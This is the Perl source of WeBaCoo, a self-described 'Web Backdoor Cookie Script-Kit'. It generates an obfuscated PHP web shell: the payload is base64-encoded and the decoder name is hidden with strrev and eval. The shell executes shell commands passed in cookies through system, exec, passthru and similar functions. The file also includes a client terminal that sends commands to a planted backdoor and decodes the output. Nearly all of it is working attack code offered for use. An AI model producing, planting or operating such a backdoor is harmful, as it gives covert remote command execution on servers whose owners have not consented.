#!/usr/bin/perl

use strict;
use warnings;
use URI;
use Getopt::Std;
use MIME::Base64;
use IO::Socket;

## Variables ##
my(%WEBACOO,%args);

# PHP system functions used in backdoor code
my @phpsf = ("system", "shell_exec", "exec", "passthru", "popen");

# Setup
$WEBACOO{name} = "webacoo.pl";
$WEBACOO{version} = '0.1.3';
$WEBACOO{description} = 'Web Backdoor Cookie Script-Kit';
$WEBACOO{author} = 'Anestis Bechtsoudis';
$WEBACOO{email} = 'anestis@bechtsoudis.com';
$WEBACOO{website} = 'http(s)://bechtsoudis.com';
$WEBACOO{twitter} = '@anestisb';
$WEBACOO{sfuntion} = $phpsf[0]; 		# Default is system()
$WEBACOO{agent} = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0.2) Gecko/20100101 Firefox/6.0.2";
$WEBACOO{cookie} = "M-cookie";
$WEBACOO{delim} = "wBc";			# Default delimiter
$WEBACOO{url} = '';
$WEBACOO{rhost} = '';
$WEBACOO{rport} = '80';
$WEBACOO{uri} = '';
$WEBACOO{proxy_ip} = '';
$WEBACOO{proxy_port} = '';
$WEBACOO{vlevel} = 0;				# Default verbose level=0

## Help Global Variables ##
my $command = '';
my $request = '';
my $output = '';
my $sock = '';

# HTTP Proxy variables
my @pargs = ();
my $proxy_user = '';
my $proxy_pass = '';

# Verbose data
my @verdata = ();

# Print WeBaCoo logo
print_logo();

# Parse command args
getopts("gf:ro:tu:c:a:d:p:v:h", \%args) or die "getopts() returned 0\n";

# Check for invalid arguments
if($ARGV[0]) { print "[-] Invalid option:$ARGV[0]\n"; exit; }

# Print usage in -h case
print_usage() if $args{h};

#################################################################################
# Generate backdoor code
#################################################################################
if(defined $args{g}) {

    # Check output filename
    if(!defined $args{o}) {
        print "[-] No output file specified!\n";
	exit;
    }

    # Check PHP function number if -f is used
    if(defined $args{f}) {
        if($args{f} =~ /^[1-5]$/) { $WEBACOO{sfuntion} = $phpsf[$args{f}-1]; }
	else { 
	    print "[-] -f $args{f}: Unknown function number!\n";
	    print "\nUse -h for help\n";
	    exit;
	}
    }

    generate_backdoor();
    exit;
}

#################################################################################
# Establish remote "terminal" connection
#################################################################################
if(defined $args{t}) {

    # Check URL
    if(!defined $args{u}) {
	print "[-] No url specified!\n";
	exit;
    }

    # Parse URL
    $WEBACOO{url} = URI->new($args{u});
    $WEBACOO{rhost} = $WEBACOO{url}->host;
    $WEBACOO{rport} = $WEBACOO{url}->port;
    $WEBACOO{uri} = $WEBACOO{url}->path;

    # Check for user specified user-agent
    if(defined $args{a}) { $WEBACOO{agent}=$args{a}; }

    # Check for user specified cookie-name
    if(defined $args{c}) { $WEBACOO{cookie}=$args{c}; }

    # Check for user specified delimiter
    if(defined $args{d}) { $WEBACOO{delim}=$args{d}; }

    # Delimiter cannot be equal to cookie name
    if(defined $args{d} && defined $args{c} && ($args{d} eq $args{c})) { 
	print "[-] Use DELIM != C_NAME\n"; exit; 
    }

    # Check for user specified verbose levels
    if(defined $args{v}) {
	if($args{v} =~ /^[0-2]$/) { $WEBACOO{vlevel} = $args{v}; }
        else {
            print "[-] -v $args{v}: Unknown verbosity level!\n";
            print "\nUse -h for help\n";
            exit;
        }
    }

    # Print quit help message
    print "Type 'exit' to quit terminal!\n\n";

    # "Terminal" connection loop
    while(1) {
        print "webacoo> ";
    	chop($command=<STDIN>);

	# Exit if "exit" is typed
    	if($command eq "exit") { print "\n^Bye^\n"; last; }
    	cmd_request();
    }
}


#################################################################################
# Help functions
#################################################################################

#################################################################################
# Print logo
sub print_logo
{
print qq(
 WeBaCoo $WEBACOO{version} - $WEBACOO{description}
 Written by $WEBACOO{author} { $WEBACOO{twitter} | $WEBACOO{email} }
 $WEBACOO{website}

);
}

#################################################################################
# Print help page
sub print_usage
{
print qq(
Usage: webacoo.pl [options]

Options:
  -g		Generate backdoor code (-o is required)

  -f FUNCTION	PHP System function to use
	FUNCTION
		1: system 	(default)
		2: shell_exec
		3: exec
		4: passthru
		5: popen

  -o OUTPUT	Generated backdoor output filename

  -r 		Return un-obfuscated backdoor code

  -t		Establish remote "terminal" connection (-u is required)

  -u URL	Backdoor URL

  -c C_NAME	Cookie name (default "M-cookie")

  -d DELIM	Delimiter (default "wBc")

  -a AGENT	HTTP header user-agent (default exist)

  -p PROXY	Use proxy (IP:PORT or USER:PASS:IP:PORT)

  -v LEVEL	Verbose level
	LEVEL
		0: no additional info (default)
		1: print HTTP headers
		2: print HTTP headers + data

  -h		Display help and exit
);

exit;
}

#################################################################################
# Generate backdoor code
sub generate_backdoor
{
    my $cmd = '';

    # Command is retrieved under the relative Cookie from the client 
    if (!$args{r}) { $cmd = "base64_decode(\$_COOKIE['cm'])"; }
    # If raw output mode used, protect base64 decoder
    else { $cmd = "\$b(\$_COOKIE['cm'])"; }

    # PHP system functions usage
    my %payloads = (
        "system" => "system($cmd.' 2>&1');",
        "shell_exec" => "echo shell_exec($cmd.' 2>&1');",
        "exec" => "exec($cmd.' 2>&1', \$d);echo(join(\"\\n\",\$d).\"\\n\");",
        "passthru" => "passthru($cmd.' 2>&1');",
        "popen" => "\$h=popen($cmd.' 2>&1','r');while(!feof(\$h))echo(fread(\$h,2048));pclose(\$h);",
    );

    # Form the final payload
    my $payload = "if(isset(\$_COOKIE['cm'])){ob_start();";
    $payload .= '$b=strrev("edoced_4"."6esab");' if ($args{r});
    $payload .= "$payloads{$WEBACOO{sfuntion}}setcookie(\$_COOKIE['cn'],\$_COOKIE['cp'].".
	"base64_encode(ob_get_contents()).\$_COOKIE['cp']);ob_end_clean();}";

    # PHP tags
    my $prefix = "<?php ";
    my $suffix = " ?>";

    # Check for raw code output flag,
    # otherwise encode payload & append the tags
    if(!defined $args{r}) {
        $payload = encode_base64($payload, '');
	$prefix .= '$b=strrev("edoced_4"."6esab");eval($b("';
	$suffix = "\"));".$suffix
    }

    # Create backdoor file
    open (OUTFILE, ">$args{o}");
    print OUTFILE $prefix.$payload.$suffix;
    close (OUTFILE);
    print "[+] Backdoor file \"$args{o}\" created.\n";
}

#################################################################################
# Backdoor: send request & get response
sub cmd_request
{
    my $dst_host = $WEBACOO{rhost};
    my $dst_port = $WEBACOO{rport};

    # Check for Proxy args
    if(defined $args{p}) { 
	@pargs=split(':',$args{p});
	if(@pargs==2) { ($dst_host, $dst_port) = @pargs; }
	elsif(@pargs==4) { ($proxy_user, $proxy_pass, $dst_host, $dst_port) = @pargs; }
	else { 
	    print "[-] Invalid Proxy arguments!\n"; 
	    print "\nUse -h for help\n";
            exit; 
	}
    }

    # Form GET request
    $request = "GET http://$WEBACOO{rhost}$WEBACOO{uri} HTTP/1.1\r\n";
    $request .= "Host: $WEBACOO{rhost}:$WEBACOO{rport}\r\n";
    $request .= "Agent: $WEBACOO{agent}\r\n";
    $request .= "Connection: Close\r\n";
    $request .= "Cookie: cm=".encode_base64($command,'').";".
        " cn=$WEBACOO{cookie}; cp=$WEBACOO{delim}\r\n";
    $request .= "Proxy-Authorization: Basic ".encode_base64($proxy_user.":".$proxy_pass,'')."\r\n" if($proxy_user && $proxy_pass);
    $request .= "\r\n";

    # Print request if verbose level > 0
    print "*** Request HTTP Header ***\n$request" if($WEBACOO{vlevel} > 0);

    # Establish connection
    my $sock=IO::Socket::INET->new(
                                   PeerAddr=> $dst_host,
                                   PeerPort => $dst_port,
                                   Proto => "tcp",
                                  );
    # Error checking
    die "Could not create socket: $!\n" unless $sock;

    # Send GET request
    print $sock $request;

    # Get server response
    my $line;
    while ($line = <$sock>) { $output .= $line; }

    # Close socket
    close($sock);

    # Split HTTP header + data and print according to verbose level
    @verdata = split (/^\r\n/m,$output);
    $verdata[1] = "" if (@verdata == 1); # If data field is empty
    chomp($verdata[0]);
    print "*** Response HTTP Header ***\n$verdata[0]\n\n" if($WEBACOO{vlevel} > 0);
    print "*** Response HTTP Data ***\n$verdata[1]\n\n" if($WEBACOO{vlevel} > 1);
    print "*** Command Output ***\n" if($WEBACOO{vlevel} > 0);

    # Unescape URI escaped special characters
    $output =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;

    # Check for HTTP 4xx error status codes
    if($output =~ m/^HTTP\/1\.[0,1].+4\d{2}.+\n/)
    {
	print "\n[!] 4xx error server response.\n";
	print "Terminal closed.\n";
	exit ;
    }

    # Locate cookie data
    my $start = index($output,$WEBACOO{delim})+length($WEBACOO{delim});
    my $end = index($output,$WEBACOO{delim},$start);
    $output = substr($output,$start,$end-$start);

    # Decode response and print output
    print decode_base64($output);

    # Flush content
    @verdata = ();
    $output = '';
}
